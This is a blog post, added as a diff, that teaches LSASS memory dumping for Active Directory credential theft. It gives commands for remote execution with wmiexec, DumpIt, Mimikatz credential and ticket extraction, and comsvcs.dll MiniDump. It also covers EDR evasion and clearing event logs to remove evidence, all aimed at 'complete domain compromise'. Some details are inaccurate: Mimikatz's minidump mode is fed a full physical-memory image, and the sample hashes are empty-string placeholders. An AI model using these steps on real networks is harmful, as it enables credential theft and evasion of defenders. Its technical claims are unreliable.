@@ -1,0 +1,356 @@
+---
+layout: post
+title: "Active Directory 101: LSASS Dump 2025 - Memory Credential Extraction"
+date: 2025-08-04 15:00:00 +0000
+categories: [active-directory, lsass, credential-extraction]
+tags: [lsass-dump, mimikatz, dumpit, memory-analysis, credential-harvesting, post-exploitation]
+description: "Master modern LSASS memory dumping and analysis techniques - from remote extraction to credential harvesting with Mimikatz in 2025"
+---
+
+# Active Directory 101: LSASS Dump 2025
+*Advanced Memory Credential Extraction*
+
+---
+
+## What is LSASS?
+
+<div class="tool-showcase" markdown="1">
+**Local Security Authority Subsystem Service**
+
+*The Holy Grail of Windows Credential Storage*
+</div>
+
+LSASS is the Windows process responsible for handling authentication and storing active credentials in memory. It contains live credentials for all logged-in users and serves as the primary target for credential extraction attacks.
+
+---
+
+## What LSASS Contains
+
+Understanding what's stored in LSASS memory is crucial for effective credential extraction:
+
+### Credential Types in LSASS
+
+| Type | Description | Attack Value |
+|------|-------------|--------------|
+| **Password Hashes** | NTLM hashes, LM hashes (legacy), Cached domain credentials | Pass-the-Hash attacks |
+| **Kerberos Tickets** | TGT (Ticket Granting Tickets), TGS (Service Tickets), Golden/Silver ticket material | Pass-the-Ticket attacks |
+| **Plaintext Passwords** | WDigest credentials, LiveSSP passwords, TSPkg credentials | Direct authentication |
+| **Encryption Keys** | AES keys, DES keys, RC4 keys | Advanced Kerberos attacks |
+
+<div class="danger-box" markdown="1">
+**Critical Target:** LSASS contains live credentials for all logged-in users and cached domain credentials!
+</div>
+
+---
+
+## LSASS Dump 2025 Methodology
+
+### Modern Five-Step Process
+
+1. **Upload DumpIt.exe** - Deploy memory dumping tool to target
+2. **Execute Dump** - Create full memory dump via remote execution
+3. **Parse Remotely** - Analyze dump via SMB without downloading
+4. **Extract Credentials** - Use Mimikatz to extract secrets
+5. **Cleanup** - Remove dump files and tools
+
+<div class="warning-box" markdown="1">
+**2025 Update:** Focus on remote analysis to avoid large file transfers and reduce forensic footprint
+</div>
+
+---
+
+## Analysis Methods
+
+### Three Approaches to Memory Dump Analysis
+
+| Method | Description | Best Use Case |
+|--------|-------------|---------------|
+| **Remote SMB Parsing** | Parse dump via SMB mount, no file transfer needed | **Preferred** - Access `\\target\C$\dump.dmp` |
+| **Download & Parse** | Download full dump, local Mimikatz analysis | Detailed analysis when bandwidth allows |
+| **Dump Splitting** | Use ResizeIt.exe to split large dumps (<500MB chunks) | **Experimental** - Large environments |
+
+### Typical Dump Sizes
+
+<div class="file-size-info" markdown="1">
+- **Workstation:** 2-8 GB
+- **Server:** 8-32 GB  
+- **Domain Controller:** 16-64 GB
+</div>
+
+---
+
+## DumpIt.exe - The Memory Dumper
+
+<div class="tool-showcase" markdown="1">
+**DumpIt by Comae Technologies**
+
+Professional memory acquisition tool for Windows systems
+</div>
+
+### Why DumpIt?
+
+- **Reliable:** Industry-standard memory dumping
+- **Fast:** Efficient memory acquisition  
+- **Compatible:** Works on all Windows versions
+- **Forensically sound:** Bit-for-bit memory copy
+
+### DumpIt Usage
+
+```bash
+# Upload DumpIt to target system
+wmiexec.py domain/user@target
+
+# Upload DumpIt.exe to target
+put /share/tools/DumpIt.exe C:\Windows\temp\DumpIt.exe
+
+# Execute memory dump
+C:\Windows\temp\DumpIt.exe /silent /output C:\temp\memory.dmp
+```
+
+<div class="warning-box" markdown="1">
+**OPSEC Note:** DumpIt may trigger AV/EDR. Consider living-off-the-land alternatives for stealth operations.
+</div>
+
+---
+
+## Demo: Upload & Execute
+
+### Lab Scenario Commands
+
+```bash
+# Connect to target with Domain Admin privileges (from RBCD attack)
+proxychains wmiexec.py sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local -k -no-pass
+
+# Upload DumpIt from shared directory
+put Y:\share\deploy\DumpIt.exe C:\Windows\temp\DumpIt.exe
+
+# Execute memory dump
+C:\Windows\temp\DumpIt.exe /live /output C:\temp\kingslanding_memory.dmp
+```
+
+### Expected Output
+
+```
+DumpIt - Physical Memory Dumper v3.0
+Copyright (c) 2022 Comae Technologies
+
+[+] Acquiring physical memory...
+[+] Physical memory size: 8,192 MB
+[+] Dumping to: C:\temp\kingslanding_memory.dmp
+[████████████████████████████████████████] 100%
+[+] Memory dump completed successfully
+[+] Dump size: 8,589,934,592 bytes (8.0 GB)
+```
+
+<div class="danger-box" markdown="1">
+**For Lab Safety:** We won't actually execute this to avoid overloading the shared lab environment
+</div>
+
+---
+
+## Remote Memory Analysis
+
+### Remote Analysis Flow
+
+1. **Mount SMB** - Access `\\target\C$\`
+2. **Upload mimilib.dll** - Mimikatz parsing library
+3. **Parse Remotely** - Extract credentials via SMB path
+4. **Profit** - Hashes & tickets extracted!
+
+### Remote Analysis Commands
+
+```bash
+# Upload Mimikatz parsing library
+put Z:\share\mimilib.dll C:\Windows\temp\mimilib.dll
+
+# Use Mimikatz to parse remote dump
+mimikatz.exe "privilege::debug" "sekurlsa::minidump \\kingslanding\C$\temp\memory.dmp" "sekurlsa::logonpasswords" "exit"
+```
+
+<div class="success-box" markdown="1">
+**Advantage:** No need to download 8GB+ files - analyze remotely over SMB!
+</div>
+
+---
+
+## Mimikatz Analysis
+
+### Full Mimikatz Extraction
+
+```bash
+# Full Mimikatz credential extraction
+mimikatz.exe
+privilege::debug
+sekurlsa::minidump C:\temp\memory.dmp
+sekurlsa::logonpasswords
+sekurlsa::tickets
+sekurlsa::ekeys
+lsadump::secrets
+exit
+```
+
+### Mimikatz Output Example
+
+```
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : KINGSLANDING$
+Domain            : SEVENKINGDOMS
+Logon Server      : (null)
+SID               : S-1-5-20
+    msv:
+     [00000003] Primary
+     * Username : KINGSLANDING$
+     * Domain   : SEVENKINGDOMS
+     * NTLM     : aad3b435b51404eeaad3b435b51404ee
+     * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
+```
+
+<div class="success-box" markdown="1">
+**Jackpot!** We've extracted machine account credentials and can now perform DCSync attacks!
+</div>
+
+---
+
+## Advanced Credential Extraction
+
+### Advanced Extraction Targets
+
+| Category | Contents | Attack Applications |
+|----------|----------|-------------------|
+| **Kerberos Tickets** | TGT extraction, Service tickets, Golden ticket material | Pass-the-Ticket, Golden tickets |
+| **Domain Secrets** | KRBTGT hash, Computer accounts, Service accounts | Golden tickets, DCSync |
+| **High-Value Targets** | Domain/Enterprise Admin credentials, Service principals | Complete domain compromise |
+| **Encryption Keys** | AES256 keys, RC4 keys, DES keys | Advanced Kerberos attacks |
+
+### Advanced Mimikatz Commands
+
+```bash
+# Advanced Mimikatz commands for specific extractions
+sekurlsa::tickets /export          # Export all Kerberos tickets
+sekurlsa::ekeys                     # Extract encryption keys  
+sekurlsa::dpapi                     # Extract DPAPI master keys
+lsadump::secrets                    # Extract LSA secrets
+lsadump::cache                      # Extract cached domain logons
+```
+
+---
+
+## OPSEC & Evasion Techniques
+
+### Detection Risks
+
+- **Process creation alerts** - DumpIt.exe execution
+- **Large file creation** - Multi-GB dump files
+- **LSASS process access** - Memory reading attempts
+- **Unusual memory usage** - Significant RAM consumption
+
+### Evasion Strategies
+
+- **Use legitimate tools** - Task Manager, built-in utilities
+- **Process hollowing** - Hide malicious activity in legitimate processes
+- **Direct system calls** - Bypass API monitoring
+- **Memory-only execution** - Avoid disk artifacts
+
+### Alternative Methods
+
+```bash
+# Alternative: Living off the land with built-in tools
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [LSASS_PID] C:\temp\lsass.dmp full
+
+# PowerShell method (requires admin)
+Get-Process lsass | Out-Minidump -DumpFilePath C:\temp\lsass.dmp
+```
+
+<div class="warning-box" markdown="1">
+**Modern EDR:** Many endpoint solutions now monitor LSASS access attempts and memory dumps
+</div>
+
+---
+
+## Cleanup Best Practices
+
+### Essential Cleanup Steps
+
+- **Delete dump files immediately** - Remove large memory dumps
+- **Clear Windows event logs** - Remove evidence of activities
+- **Remove uploaded tools** - Delete DumpIt.exe and other tools
+- **Clear PowerShell history** - Remove command history
+
+---
+
+## LSASS Dump 2025 Key Takeaways
+
+<div class="takeaway-box" markdown="1">
+**LSASS is the goldmine:** Contains all active credentials and tickets
+</div>
+
+<div class="takeaway-box" markdown="1">
+**Remote analysis preferred:** Parse dumps via SMB to avoid large transfers
+</div>
+
+<div class="takeaway-box" markdown="1">
+**DumpIt.exe is reliable:** Professional tool for memory acquisition
+</div>
+
+<div class="takeaway-box" markdown="1">
+**Mimikatz extracts everything:** Passwords, hashes, tickets, and keys
+</div>
+
+<div class="takeaway-box" markdown="1">
+**Essential Tools:** DumpIt.exe, Mimikatz, mimilib.dll
+</div>
+
+<div class="takeaway-box" markdown="1">
+**2025 Focus:** Remote analysis & minimal footprint
+</div>
+
+---
+
+## Primary Goal
+
+<div class="success-box" markdown="1">
+**Extract Domain Admin credentials and achieve complete domain compromise**
+</div>
+
+<div class="danger-box" markdown="1">
+**LSASS memory dumps can contain the keys to the entire domain!**
+
+Handle with extreme care and always clean up after analysis
+</div>
+
+---
+
+## Pro Tips
+
+- **Prioritize remote analysis** - Avoid downloading multi-GB files when possible
+- **Use SMB for parsing** - Mount `\\target\C$\` and parse dumps in place
+- **Target high-value systems** - Domain Controllers contain the most valuable credentials
+- **Always clean up** - Remove dumps and tools to minimize forensic evidence
+- **Consider alternatives** - Built-in Windows tools can sometimes bypass EDR detection
+- **Monitor file sizes** - Large dumps may indicate high-value targets
+
+---
+
+## Real-World Impact
+
+LSASS dumps are critical for:
+
+1. **Complete Credential Harvesting** - All active and cached credentials
+2. **Lateral Movement** - Service account and user passwords
+3. **Privilege Escalation** - Domain and Enterprise Admin credentials
+4. **Persistence** - Kerberos tickets and encryption keys
+5. **Domain Domination** - KRBTGT hash for Golden ticket attacks
+
+---
+
+*This post is part of the Active Directory 101 series. LSASS memory analysis represents one of the most effective post-exploitation techniques for complete domain compromise.*
+
+## References
+
+- [DumpIt by Comae Technologies](https://comae.com/)
+- [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz)
+- [Microsoft LSASS Documentation](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication)
+- [SANS LSASS Analysis Techniques](https://www.sans.org/white-papers/)
